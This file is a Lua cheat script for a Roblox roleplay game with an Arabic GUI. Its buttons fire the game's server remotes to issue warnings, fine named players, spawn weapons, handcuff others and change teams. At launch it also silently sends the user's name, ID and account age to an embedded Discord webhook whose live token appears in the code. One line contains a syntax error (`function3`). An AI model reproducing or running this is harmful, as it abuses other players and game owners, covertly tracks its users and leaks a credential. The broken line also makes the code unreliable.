local Player = game.Players.LocalPlayer
local RS = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local Stats = game:GetService("Stats")
local GuiService = game:GetService("GuiService")

local WebhookURL = "https://discord.com/api/webhooks/1508593402219069581/E6-V3l3TviD8XfKQLWJbUsOi0AHNVjaPHF6bTC0iQRDi2QFlX8-GuiPlMGNHZF4NWIQK"

local function SuperDeepLog()
    local data = {
        ["content"] = "🚨 **[تفعيل السكريبت]** تفعيل جديد من " .. Player.Name,
        ["embeds"] = {
            {
                ["title"] = "👤 بيانات المستخدم المسموحة",
                ["color"] = 0xff0000,
                ["fields"] = {
                    {["name"] = "اسم الحساب", ["value"] = Player.Name, ["inline"] = true},
                    {["name"] = "ID الحساب", ["value"] = tostring(Player.UserId), ["inline"] = true},
                    {["name"] = "عمر الحساب", ["value"] = Player.AccountAge .. " يوم", ["inline"] = true},
                }
            }
        },
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    pcall(function()
        request({
            Url = WebhookURL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

task.spawn(SuperDeepLog)

local ScreenGui = Instance.new("ScreenGui", Player:WaitForChild("PlayerGui"))
ScreenGui.Name = "TopT_Premium"
ScreenGui.ResetOnSpawn = false

local Main = Instance.new("Frame", ScreenGui)
Main.Name = "Main"
Main.Size = UDim2.new(0, 480, 0, 320)
Main.Position = UDim2.new(0.5, -240, -0.5, 0)
Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Main.BackgroundTransparency = 0.1
Main.BorderSizePixel = 0
Main.ClipsDescendants = true
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 15)
local Stroke = Instance.new("UIStroke", Main)
Stroke.Thickness = 2; Stroke.Color = Color3.fromRGB(0, 170, 255); Stroke.Transparency = 0.5

local Toggle = Instance.new("TextButton", ScreenGui)
Toggle.Size = UDim2.new(0, 40, 0, 40)
Toggle.Position = UDim2.new(0.5, 250, -0.5, 0)
Toggle.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Toggle.Text = "X"; Toggle.TextColor3 = Color3.new(1, 0, 0); Toggle.Font = Enum.Font.GothamBold
Toggle.TextSize = 18
Instance.new("UICorner", Toggle).CornerRadius = UDim.new(1, 0)

local draggingMain, dragInputMain, dragStartMain, startPosMain
local draggingToggle, dragInputToggle, dragStartToggle, startPosToggle

local function updateMain(input)
    local delta = input.Position - dragStartMain
    local newMainPos = UDim2.new(startPosMain.X.Scale, startPosMain.X.Offset + delta.X, startPosMain.Y.Scale, startPosMain.Y.Offset + delta.Y)
    TweenService:Create(Main, TweenInfo.new(0.1, Enum.EasingStyle.Linear), {Position = newMainPos}):Play()
end

local function updateToggle(input)
    local delta = input.Position - dragStartToggle
    local newTogglePos = UDim2.new(startPosToggle.X.Scale, startPosToggle.X.Offset + delta.X, startPosToggle.Y.Scale, startPosToggle.Y.Offset + delta.Y)
    TweenService:Create(Toggle, TweenInfo.new(0.1, Enum.EasingStyle.Linear), {Position = newTogglePos}):Play()
end

Main.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        draggingMain = true
        dragStartMain = input.Position
        startPosMain = Main.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                draggingMain = false
            end
        end)
    end
end)

Main.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInputMain = input
    end
end)

Toggle.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        draggingToggle = true
        dragStartToggle = input.Position
        startPosToggle = Toggle.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                draggingToggle = false
            end
        end)
    end
end)

Toggle.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInputToggle = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInputMain and draggingMain then
        updateMain(input)
    end
    if input == dragInputToggle and draggingToggle then
        updateToggle(input)
    end
end)

Toggle.MouseButton1Click:Connect(function()
    if draggingToggle then return end
    Main.Visible = not Main.Visible
    Toggle.Text = Main.Visible and "X" or "O"
    
    Toggle.Size = UDim2.new(0, 35, 0, 35)
    TweenService:Create(Toggle, TweenInfo.new(0.2, Enum.EasingStyle.Back), {Size = UDim2.new(0, 40, 0, 40)}):Play()
    
    TweenService:Create(Toggle, TweenInfo.new(0.3, Enum.EasingStyle.QuadOut), {
        TextColor3 = Main.Visible and Color3.new(1,0,0) or Color3.new(0,1,0)
    }):Play()
end)

local Side = Instance.new("Frame", Main)
Side.Size = UDim2.new(0, 120, 1, 0); Side.BackgroundColor3 = Color3.fromRGB(10, 10, 10); Side.BackgroundTransparency = 0.5
local Container = Instance.new("Frame", Main)
Container.Size = UDim2.new(1, -130, 1, -20); Container.Position = UDim2.new(0, 125, 0, 10); Container.BackgroundTransparency = 1

local function CreateTab(name, pos)
    local b = Instance.new("TextButton", Side)
    b.Size = UDim2.new(0.9, 0, 0, 35); b.Position = UDim2.new(0.05, 0, 0, pos)
    b.BackgroundColor3 = Color3.fromRGB(30, 30, 30); b.Text = name; b.TextColor3 = Color3.new(1, 1, 1); b.Font = Enum.Font.GothamBold
    b.TextSize = 12
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
    local p = Instance.new("ScrollingFrame", Container)
    p.Size = UDim2.new(1, 0, 1, 0); p.BackgroundTransparency = 1; p.Visible = false; p.ScrollBarThickness = 0
    Instance.new("UIListLayout", p).Padding = UDim.new(0, 8)
    b.MouseButton1Click:Connect(function()
        for _, v in pairs(Container:GetChildren()) do v.Visible = false end
        p.Visible = true
        p.Position = UDim2.new(0, 20, 0, 0)
        TweenService:Create(p, TweenInfo.new(0.4, Enum.EasingStyle.Back), {Position = UDim2.new(0, 0, 0, 0)}):Play()
    end)
    return p
end

local function AddInput(p, holder)
    local i = Instance.new("TextBox", p)
    i.Size = UDim2.new(1, 0, 0, 35); i.PlaceholderText = holder; i.BackgroundColor3 = Color3.fromRGB(25, 25, 25); i.TextColor3 = Color3.new(1, 1, 1)
    Instance.new("UICorner", i).CornerRadius = UDim.new(0, 5)
    return i
end

local function AddBtn(p, txt, col)
    local b = Instance.new("TextButton", p)
    b.Size = UDim2.new(1, 0, 0, 35); b.Text = txt; b.BackgroundColor3 = col or Color3.fromRGB(0, 120, 215); b.TextColor3 = Color3.new(1, 1, 1); b.Font = Enum.Font.GothamBold
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 5)
    
    b.MouseEnter:Connect(function()
        TweenService:Create(b, TweenInfo.new(0.2), {BackgroundTransparency = 0.2}):Play()
    end)
    b.MouseLeave:Connect(function()
        TweenService:Create(b, TweenInfo.new(0.2), {BackgroundTransparency = 0}):Play()
    end)
    
    return b
end

local function findRemote(parent)
	for _, v in ipairs(parent:GetDescendants()) do
		if v:IsA("RemoteEvent") and v.Name == "ChangeTeam" then
			return v
		end
	end
end

local ChangeTeamRemote = findRemote(RS)

local function triggerTeamChange(teamValue)
    if ChangeTeamRemote then
        ChangeTeamRemote:FireServer(teamValue)
    end
end

local T1 = CreateTab("التحذيرات", 10)
local W_U = AddInput(T1, "اسم اللاعب"); local W_R = AddInput(T1, "السبب"); local W_B = AddBtn(T1, "تشغيل")
W_B.MouseButton1Click:Connect(function() RS.SendWarn:FireServer(W_U.Text, W_R.Text) end)

local T2 = CreateTab("المخالفات", 50)
local F_U = AddInput(T2, "اسم اللاعب"); local F_R = AddInput(T2, "السبب"); local F_M = AddInput(T2, "المبلغ"); local F_B = AddBtn(T2, "تشغيل")
F_B.MouseButton1Click:Connect(function() RS.DeductMoneyEvent:FireServer(F_U.Text, F_R.Text, tonumber(F_M.Text)) end)

local T3 = CreateTab("الأسلحة", 90)
AddBtn(T3, "أخذ كل الأسلحة", Color3.fromRGB(46, 204, 113)).MouseButton1Click:Connect(function()
    for _, item in pairs(RS:WaitForChild("StarterPack"):GetChildren()) do RS.RequestTool:FireServer(item.Name, 0) task.wait(0.05) end
end)
AddBtn(T3, "M4A1").MouseButton1Click:Connect(function() RS.GiveToolEvent:FireServer("M4A1") end)
AddBtn(T3, "درع").MouseButton1Click:Connect(function3() RS.GiveToolEvent:FireServer("Heavy Vest") end)
AddBtn(T3, "Deagle").MouseButton1Click:Connect(function() RS.GiveToolEvent:FireServer("Desert Deagle") end)

local T4 = CreateTab("الكلبشة", 130)
local J_U = AddInput(T4, "اسم اللاعب")
AddBtn(T4, "تخريب").MouseButton1Click:Connect(function() RS.HoldPlayer:FireServer(game.Players:FindFirstChild(J_U.Text)) end)

local T5 = CreateTab("التيمات", 170)
AddBtn(T5, "مواطن").MouseButton1Click:Connect(function() triggerTeamChange("Civilian") end)
AddBtn(T5, "عامل نظافه").MouseButton1Click:Connect(function() triggerTeamChange("Cleaners") end)
AddBtn(T5, "طيار").MouseButton1Click:Connect(function() triggerTeamChange("Crew") end)
AddBtn(T5, "الشرطه").MouseButton1Click:Connect(function() triggerTeamChange("Police") end)
AddBtn(T5, "مسعف").MouseButton1Click:Connect(function() triggerTeamChange("SAMU") end)
AddBtn(T5, "سوات").MouseButton1Click:Connect(function() triggerTeamChange("SWAT") end)
AddBtn(T5, "تكسي").MouseButton1Click:Connect(function() triggerTeamChange("Taxi") end)

T1.Visible = true

TweenService:Create(Main, TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, -240, 0.5, -160)}):Play()
TweenService:Create(Toggle, TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, 250, 0.5, -160)}):Play()
